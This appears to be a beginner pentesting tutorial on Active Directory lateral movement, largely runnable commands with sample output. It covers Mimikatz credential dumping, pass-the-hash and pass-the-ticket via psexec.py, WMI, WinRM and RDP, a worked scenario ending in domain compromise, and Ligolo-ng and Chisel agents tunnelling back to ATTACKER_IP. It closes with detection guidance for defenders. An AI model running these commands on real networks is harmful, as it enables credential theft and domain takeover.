# 🚶‍♂️ Lateral Movement in Active Directory — Beginner-Friendly Guide

## 📖 What Is Lateral Movement? (Simple Explanation)

Imagine you break into one room of a building. **Lateral movement** is when you move from that room to other rooms — looking for the master key (Domain Admin).

> **Lateral Movement** = Moving from one compromised computer to another inside the same network, until you reach the most important system (Domain Controller).

Think of it like this:

```text
You are a thief who entered through the window of Room 1 (a normal PC).
Your goal is to reach the VAULT (Domain Controller).
You move room by room, stealing keys along the way.

  Room 1 → Room 2 → Room 3 → 🏦 VAULT
  (PC)      (File    (Admin    (Domain
             Server)  Server)   Controller)
```

---

## 🧠 Why Is Lateral Movement Important?

When an attacker first gets into a network (called **initial access**), they usually land on a **low-value machine** — like an employee's workstation.

The **valuable stuff** (Domain Admin, databases, secrets) is on other machines.

So the attacker MUST move laterally to reach those targets.

```text
┌─────────────────────────────────────────────────────────┐
│                    CORPORATE NETWORK                    │
│                                                         │
│   🎣 Phishing Email                                     │
│      ↓                                                  │
│   ┌──────────┐    ┌──────────┐    ┌──────────┐         │
│   │  💻 WS01 │───▶│ 📁 FILE01│───▶│ 🖥 APP01 │         │
│   │ Employee │    │   File   │    │   App    │         │
│   │ PC       │    │  Server  │    │  Server  │         │
│   │ 10.0.0.5 │    │ 10.0.0.10│    │ 10.0.0.20│         │
│   └──────────┘    └──────────┘    └──────────┘         │
│       ↑                                ↓                │
│   Attacker                        ┌──────────┐         │
│   Lands Here                      │ 🏰 DC01  │         │
│   (LOW value)                     │ Domain   │         │
│                                   │Controller│         │
│                                   │ 10.0.0.100│        │
│                                   └──────────┘         │
│                                   GOAL! (HIGH value)    │
└─────────────────────────────────────────────────────────┘
```

---

## 📋 The 5 Steps of Lateral Movement (Easy to Remember)

```text
Step 1: 🎣 LAND        → Get initial access (phishing, exploit, VPN)
Step 2: 🔍 LOOK AROUND → Enumerate (find users, computers, admins)
Step 3: 🔑 STEAL KEYS  → Dump credentials (passwords, hashes, tickets)
Step 4: 🚪 OPEN DOORS  → Use stolen creds to access other machines
Step 5: 🔄 REPEAT      → Keep moving until you reach Domain Controller
```

Let's explain each step in detail 👇

---

# Step 1: 🎣 LAND — Getting Initial Access

Before lateral movement, the attacker needs to get **inside** the network first.

### Common Ways to Get In

| Method | How It Works | Example |
| --- | --- | --- |
| 🎣 Phishing | Send malicious email | Employee clicks fake attachment |
| 🌐 Web Exploit | Attack public web server | SQL injection on company website |
| 🔑 Weak VPN Creds | Guess VPN password | `admin:Password123` |
| 📡 WiFi Attack | Break into corporate WiFi | Cracking WPA2 password |
| 🔌 Physical Access | Plug into network port | Evil maid attack |

### What You Have After Initial Access

```text
✅ Shell/access on ONE machine (usually low privilege)
❌ No access to other machines yet
❌ No Domain Admin yet
❌ Don't know the network layout yet
```

---

# Step 2: 🔍 LOOK AROUND — Internal Enumeration

Now you're inside. You need to understand the network before moving.

### What to Find Out

```text
❓ What is the domain name?
❓ Who are the admin users?
❓ What other computers exist?
❓ Where are the admins logged in?
❓ What shares are available?
```

### Tools for Enumeration

---

#### 🔧 Tool 1: CrackMapExec (CME)

**What it does**: Scans network, finds computers, tests credentials.

```bash
# Find all Windows machines on the network
crackmapexec smb 10.0.0.0/24

# List shared folders
crackmapexec smb 10.0.0.0/24 -u jsmith -p 'Password123' --shares

# List all domain users
crackmapexec smb 10.0.0.100 -u jsmith -p 'Password123' --users
```

**Example Output:**

```text
SMB  10.0.0.5    445  WS01     [*] Windows 10 Build 19041 (name:WS01) (domain:corp.local)
SMB  10.0.0.10   445  FILE01   [*] Windows Server 2019 (name:FILE01) (domain:corp.local)
SMB  10.0.0.20   445  APP01    [*] Windows Server 2019 (name:APP01) (domain:corp.local)
SMB  10.0.0.100  445  DC01     [*] Windows Server 2019 (name:DC01) (domain:corp.local)
```

Now you know all machines in the network! 🎯

---

#### 🔧 Tool 2: PowerView (PowerShell)

**What it does**: Queries Active Directory for detailed information.

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find all domain users
Get-DomainUser | Select-Object samaccountname, description

# Find Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Find where Domain Admin is logged in (VERY IMPORTANT!)
Find-DomainUserLocation -UserIdentity "domainadmin"
```

**Why "Find-DomainUserLocation" matters:**

```text
If Domain Admin is logged into WS05...
And you can access WS05...
You can STEAL the Domain Admin's credentials from WS05's memory!

Your Machine → Move to WS05 → Steal DA credentials → Own the Domain! 🏆
```

---

#### 🔧 Tool 3: BloodHound

**What it does**: Creates a visual MAP of the entire AD showing attack paths.

```bash
# Collect data (from Linux)
bloodhound-python -u jsmith -p 'Password123' -d corp.local -ns 10.0.0.100 -c All

# Collect data (from Windows)
SharpHound.exe -c All
```

BloodHound then shows you something like:

```text
 ┌───────────┐     Admin On     ┌───────────┐
 │  jsmith   │────────────────▶ │   WS05    │
 │ (your     │                  │           │
 │  user)    │                  └─────┬─────┘
 └───────────┘                        │
                                Has Session
                                      │
                                      ▼
                               ┌───────────┐     Member Of     ┌──────────────┐
                               │  ITAdmin  │──────────────────▶│ Domain Admins│
                               │           │                   │              │
                               └───────────┘                   └──────────────┘

 YOUR ATTACK PATH:
 jsmith → Admin on WS05 → ITAdmin logged in → ITAdmin is Domain Admin!
```

---

# Step 3: 🔑 STEAL KEYS — Credential Harvesting

You need **credentials** (passwords or hashes) to move to other machines.

### Where Credentials Hide

```text
┌────────────────────────────────────────────┐
│          PLACES TO FIND CREDENTIALS        │
│                                            │
│  💾 LSASS Memory     → Running passwords   │
│  📦 SAM Database     → Local account hashes│
│  🎫 Kerberos Tickets → Reusable tokens     │
│  📋 Cached Creds     → Stored login data   │
│  📝 Files/Scripts    → Hardcoded passwords  │
│  🌐 Browser          → Saved passwords     │
└────────────────────────────────────────────┘
```

### Tools for Credential Dumping

---

#### 🔧 Tool 4: Mimikatz (The Most Famous Tool)

**What it does**: Extracts passwords, hashes, and Kerberos tickets from memory.

```powershell
# Run Mimikatz
mimikatz.exe

# Dump ALL credentials from memory
sekurlsa::logonpasswords
```

**Example Output (Simplified):**

```text
Username : ITAdmin
Domain   : CORP
Password : ITAdmin@2025
NTLM     : a87f3a337d73085c45f9416be5787e86

Username : jsmith
Domain   : CORP
Password : Password123!
NTLM     : 64f12cddaa88057e06a81b54e73b949b
```

Now you have ITAdmin's password AND hash! 🔑

---

#### 🔧 Tool 5: Secretsdump (Impacket — from Linux)

**What it does**: Remotely dumps credentials without uploading files.

```bash
# Dump credentials from a remote machine
secretsdump.py corp.local/jsmith:Password123@10.0.0.5
```

---

# Step 4: 🚪 OPEN DOORS — Moving to Other Machines

Now that you have credentials, you can **log into other machines remotely**.

### Lateral Movement Techniques Explained

---

## 🔹 Technique 1: Pass-the-Hash (PTH)

**What is it?** Using a password **hash** instead of the actual password to log in.

**Why it works:** Windows doesn't always need the plaintext password — the hash alone is enough!

```text
Normal Login:
  User sends: "My password is: ITAdmin@2025" → Server checks → ✅ Access

Pass-the-Hash:
  Attacker sends: "My hash is: a87f3a337d73..." → Server checks → ✅ Access
  (No need to know the actual password!)
```

#### Tools for Pass-the-Hash

**CrackMapExec:**

```bash
# Test if hash works on another machine
crackmapexec smb 10.0.0.20 -u ITAdmin -H 'a87f3a337d73085c45f9416be5787e86'
```

**Output if successful:**

```text
SMB  10.0.0.20  445  APP01  [+] corp.local\ITAdmin (Pwn3d!)
```

`(Pwn3d!)` means you have **admin access** on that machine! 🎉

**Impacket psexec.py:**

```bash
# Get a shell on another machine using hash
psexec.py corp.local/ITAdmin@10.0.0.20 -hashes :a87f3a337d73085c45f9416be5787e86
```

```text
Now you have a command prompt on APP01! 🖥
C:\Windows\system32>whoami
corp\itadmin
```

---

## 🔹 Technique 2: Pass-the-Ticket (PTT)

**What is it?** Using a stolen **Kerberos ticket** to access other machines.

```text
Normal: You buy a ticket → Show ticket → Enter the event
PTT:    You steal someone's ticket → Show stolen ticket → Enter the event
```

**How to do it:**

```powershell
# Mimikatz — export all tickets
sekurlsa::tickets /export

# Inject a stolen ticket
kerberos::ptt [0;12bd0]-0-0-40810000-ITAdmin@krbtgt-CORP.LOCAL.kirbi

# Now you can access resources as ITAdmin
dir \\APP01\C$
```

---

## 🔹 Technique 3: PsExec (Remote Command Execution)

**What is it?** Creates a service on a remote machine to run commands.

```text
Your Machine                    Target Machine
┌──────────┐   SMB (port 445)   ┌──────────┐
│  Kali /  │──────────────────▶ │  APP01    │
│  WS01    │   Create service   │          │
│          │   Run command      │  cmd.exe │
│          │◀──────────────────│  runs!   │
│          │   Return output    │          │
└──────────┘                    └──────────┘
```

**Impacket psexec.py (Linux):**

```bash
# With password
psexec.py corp.local/ITAdmin:'ITAdmin@2025'@10.0.0.20

# With hash (Pass-the-Hash)
psexec.py corp.local/ITAdmin@10.0.0.20 -hashes :NTLM_HASH_HERE
```

**SysInternals PsExec (Windows):**

```powershell
PsExec.exe \\10.0.0.20 -u corp\ITAdmin -p ITAdmin@2025 cmd.exe
```

---

## 🔹 Technique 4: WMI (Windows Management Instrumentation)

**What is it?** Uses Windows built-in management tools to run commands remotely.

**Why use it?** Stealthier than PsExec — doesn't create a service.

```bash
# Impacket wmiexec (Linux)
wmiexec.py corp.local/ITAdmin:'ITAdmin@2025'@10.0.0.20
```

```powershell
# PowerShell (Windows)
Invoke-WmiMethod -ComputerName APP01 -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt"
```

---

## 🔹 Technique 5: WinRM / PowerShell Remoting

**What is it?** Uses PowerShell's built-in remote access feature.

```powershell
# Enter interactive session on remote machine
Enter-PSSession -ComputerName APP01 -Credential CORP\ITAdmin
```

**From Linux (using evil-winrm):**

```bash
evil-winrm -i 10.0.0.20 -u ITAdmin -p 'ITAdmin@2025'
```

---

## 🔹 Technique 6: RDP (Remote Desktop)

**What is it?** The familiar Windows remote desktop — graphical access.

```bash
# From Linux
xfreerdp /u:ITAdmin /p:'ITAdmin@2025' /v:10.0.0.20

# Pass-the-Hash with RDP (restricted admin mode)
xfreerdp /u:ITAdmin /pth:NTLM_HASH /v:10.0.0.20 /restricted-admin
```

---

## 📊 Technique Comparison Table (Beginner Reference)

| Technique | What You Need | Stealthiness | Difficulty | Best Tool |
| --- | --- | --- | --- | --- |
| Pass-the-Hash | NTLM hash | ⭐⭐⭐ Medium | Easy | CrackMapExec |
| Pass-the-Ticket | Kerberos ticket | ⭐⭐⭐⭐ Good | Medium | Mimikatz |
| PsExec | Password or hash | ⭐⭐ Low | Easy | Impacket |
| WMI | Password or hash | ⭐⭐⭐⭐ Good | Easy | wmiexec.py |
| WinRM | Password or hash | ⭐⭐⭐ Medium | Easy | evil-winrm |
| RDP | Password | ⭐ Very Low | Easy | xfreerdp |

---

# Step 5: 🔄 REPEAT — Keep Moving Until Domain Controller

Each time you land on a new machine:

```text
┌─────────────────────────────────────────────────────┐
│              LATERAL MOVEMENT LOOP                  │
│                                                     │
│   ┌──────────┐                                      │
│   │ Land on  │                                      │
│   │ new PC   │                                      │
│   └────┬─────┘                                      │
│        ↓                                            │
│   ┌──────────┐                                      │
│   │ Dump     │  ← Mimikatz / Secretsdump            │
│   │ Creds    │                                      │
│   └────┬─────┘                                      │
│        ↓                                            │
│   ┌──────────┐                                      │
│   │ Found    │──── YES ──▶ 🏆 YOU WIN!              │
│   │ Domain   │            Domain Compromised!       │
│   │ Admin?   │                                      │
│   └────┬─────┘                                      │
│        │ NO                                         │
│        ↓                                            │
│   ┌──────────┐                                      │
│   │ Use new  │                                      │
│   │ creds to │  ← PTH/PsExec/WMI/WinRM             │
│   │ move to  │                                      │
│   │ next PC  │                                      │
│   └────┬─────┘                                      │
│        │                                            │
│        └──────── Loop back to top ──────────────┐   │
│                                                 │   │
└─────────────────────────────────────────────────┘   │
```

---

# 🧨 Full Realistic Scenario (Step by Step)

Let's walk through a complete attack from start to finish.

### 🏢 Target: Corp.local (4 machines)

```text
Network: 10.0.0.0/24
DC01  (10.0.0.100) — Domain Controller
FILE01 (10.0.0.10) — File Server
APP01  (10.0.0.20) — App Server  
WS01   (10.0.0.5)  — Employee Workstation
```

### 🔴 Attack Walkthrough

**Step 1 — 🎣 Initial Access**

Attacker sends phishing email → employee on WS01 clicks it → reverse shell received.

```bash
# Attacker receives shell
[*] Command shell session 1 opened (attacker → 10.0.0.5)
```

**Step 2 — 🔍 Enumerate**

```bash
# Scan network from WS01
crackmapexec smb 10.0.0.0/24 -u jsmith -p 'Password123'
```

```text
Found: WS01, FILE01, APP01, DC01
```

**Step 3 — 🔑 Dump Credentials on WS01**

```powershell
# Run Mimikatz on WS01
mimikatz.exe
sekurlsa::logonpasswords
```

```text
Found: ITAdmin was recently logged in!
Username: ITAdmin
NTLM Hash: a87f3a337d73085c45f9416be5787e86
```

**Step 4 — 🚶 Move to FILE01 using ITAdmin's hash**

```bash
# Pass-the-Hash to FILE01
crackmapexec smb 10.0.0.10 -u ITAdmin -H 'a87f3a337d73085c45f9416be5787e86'
```

```text
SMB  10.0.0.10  [+] corp.local\ITAdmin (Pwn3d!)
```

```bash
# Get shell on FILE01
psexec.py corp.local/ITAdmin@10.0.0.10 -hashes :a87f3a337d73085c45f9416be5787e86
```

**Step 5 — 🔑 Dump Credentials on FILE01**

```powershell
# Look for more credentials
sekurlsa::logonpasswords
```

```text
Found: DomainAdmin logged into FILE01 yesterday!
Username: DomainAdmin
NTLM Hash: 7e29d2b3c10f8a4d...
```

**Step 6 — 🏆 Access Domain Controller!**

```bash
# Use DomainAdmin hash to access DC01
psexec.py corp.local/DomainAdmin@10.0.0.100 -hashes :7e29d2b3c10f8a4d...
```

```text
C:\Windows\system32> whoami
corp\domainadmin

🏆 DOMAIN COMPROMISED! 🏆
```

### 📊 Visual Attack Path

```text
  ATTACKER
     │
     │ Phishing
     ▼
  ┌──────────┐  Dump creds    ┌──────────┐  Dump creds    ┌──────────┐
  │  WS01    │ ────────────▶  │  FILE01  │ ────────────▶  │   DC01   │
  │ jsmith   │  Found ITAdmin │          │  Found DA      │  DOMAIN  │
  │          │  hash          │ ITAdmin  │  hash          │  ADMIN!  │
  │ 10.0.0.5 │  Pass-the-Hash │ 10.0.0.10│  Pass-the-Hash │10.0.0.100│
  └──────────┘                └──────────┘                └──────────┘
   LOW VALUE                   MEDIUM VALUE                HIGH VALUE
```

---

# 🚀 Pivoting Tools (When Machines Are in Different Networks)

Sometimes machines are in **different subnets** and you can't reach them directly. You need to **pivot** through a compromised machine.

```text
 ATTACKER                    DMZ                      INTERNAL NETWORK
 (Internet)              (Public Zone)              (Private Zone)

 ┌────────┐             ┌──────────┐              ┌──────────┐
 │  Kali  │────────────▶│ WebServer│─────────────▶│  DC01    │
 │        │  Can reach  │ 10.0.0.5 │   Can reach  │ 10.10.0.5│
 └────────┘  WebServer  └──────────┘   Internal    └──────────┘
             ONLY                      Network
                                       
   ❌ Cannot reach DC01 directly
   ✅ Can pivot THROUGH WebServer to reach DC01
```

---

### 🔧 Tool 6: Ligolo-ng (Modern Pivoting)

**What it does**: Creates a tunnel through a compromised machine so you can access internal networks.

**On Attacker (Kali):**

```bash
# Start proxy
ligolo-ng proxy -selfcert
```

**On Compromised Machine (WebServer):**

```bash
# Connect back to attacker
ligolo-ng agent -connect ATTACKER_IP:11601 -ignore-cert
```

**On Attacker — Create Tunnel:**

```bash
# In Ligolo console
session     # select the session
start       # start the tunnel

# Add route to internal network
sudo ip route add 10.10.0.0/24 dev ligolo
```

**Now you can directly scan internal network:**

```bash
nmap 10.10.0.0/24
crackmapexec smb 10.10.0.5
```

---

### 🔧 Tool 7: Chisel (Simple TCP Tunneling)

**On Attacker:**

```bash
chisel server --reverse --port 8080
```

**On Compromised Machine:**

```bash
chisel client ATTACKER_IP:8080 R:socks
```

**Now use proxychains on attacker:**

```bash
proxychains nmap 10.10.0.0/24
proxychains crackmapexec smb 10.10.0.5
```

---

# 🛠 All Tools Summary (Quick Reference)

| Tool | Purpose | Platform | Difficulty |
| --- | --- | --- | --- |
| **CrackMapExec** | Network scanning, cred testing | Linux | ⭐ Easy |
| **PowerView** | AD enumeration | Windows (PowerShell) | ⭐⭐ Medium |
| **BloodHound** | Attack path mapping | Both | ⭐⭐ Medium |
| **Mimikatz** | Credential dumping | Windows | ⭐ Easy |
| **Secretsdump** | Remote cred dumping | Linux (Impacket) | ⭐ Easy |
| **psexec.py** | Remote shell via SMB | Linux (Impacket) | ⭐ Easy |
| **wmiexec.py** | Stealthy remote shell | Linux (Impacket) | ⭐ Easy |
| **evil-winrm** | WinRM remote shell | Linux | ⭐ Easy |
| **xfreerdp** | RDP from Linux | Linux | ⭐ Easy |
| **Ligolo-ng** | Network pivoting | Both | ⭐⭐ Medium |
| **Chisel** | TCP tunneling | Both | ⭐⭐ Medium |

---

# 🛡 Blue Team — How to Detect Lateral Movement

### Windows Event IDs to Monitor

| Event ID | What It Means | Why It Matters |
| --- | --- | --- |
| **4624** (Type 3) | Network logon | Someone logged in remotely |
| **4625** | Failed logon | Someone trying wrong creds |
| **4648** | Explicit credential logon | Unusual credential usage |
| **4672** | Special privilege logon | Admin account used |
| **7045** | New service installed | PsExec creates services |
| **4688** | New process created | Watch for cmd.exe, powershell |

### Detection Tools

| Tool | What It Does |
| --- | --- |
| **Microsoft Defender for Identity** | Detects PTH, PTT, DCSync |
| **Splunk / ELK** | Log analysis and alerting |
| **Sysmon** | Detailed process and network logging |
| **Velociraptor** | Endpoint detection and response |

### What to Look For

```text
🚨 SUSPICIOUS ACTIVITIES:
  ❗ Same account logging into many machines quickly
  ❗ Admin accounts logging into workstations
  ❗ LSASS memory access (Mimikatz indicator)
  ❗ New services being created remotely
  ❗ Unusual SMB traffic patterns
  ❗ PowerShell execution with encoded commands
```

---

# 🎓 Key Takeaways for Beginners

```text
1. Lateral movement is MOVING between computers
2. You need CREDENTIALS to move (passwords, hashes, tickets)
3. The GOAL is usually the Domain Controller
4. BloodHound MAPS the attack path for you
5. Mimikatz STEALS credentials from memory
6. Pass-the-Hash lets you log in WITHOUT knowing the password
7. Defenders detect lateral movement through Windows Event Logs
```

---

# 📚 Learning Path — What to Study Next

| Order | Topic | Related Document |
| --- | --- | --- |
| 1 | How to dump credentials | `how_dump_credentials.md` |
| 2 | Cached credentials | `cached_AD_credentials.md` |
| 3 | CrackMapExec deep dive | `CrackMapExec_tool_pa.md` |
| 4 | SSH pivoting | `SSH_pivoting_lateral_movement.md` |
| 5 | Kerberoasting | `kerberoasting.md` |
| 6 | BloodHound enumeration | `bloodhound_AD_enumeration.md` |
| 7 | PowerView enumeration | `powerview_AD_enumeration.md` |
| 8 | Golden/Silver Tickets | `golden_silver_ticket_attacks.md` |
| 9 | DCSync attack | `DCSync_attack.md` |
| 10 | Build your own lab | `AD_lab_setup_guide.md` |

---

# ⚠ Ethical Reminder

Everything discussed:

* ✅ Legal only in your own lab
* ✅ Legal with written penetration testing authorization
* ❌ **Illegal** on any system without permission
* 🎓 Understanding attacks helps you **defend better**
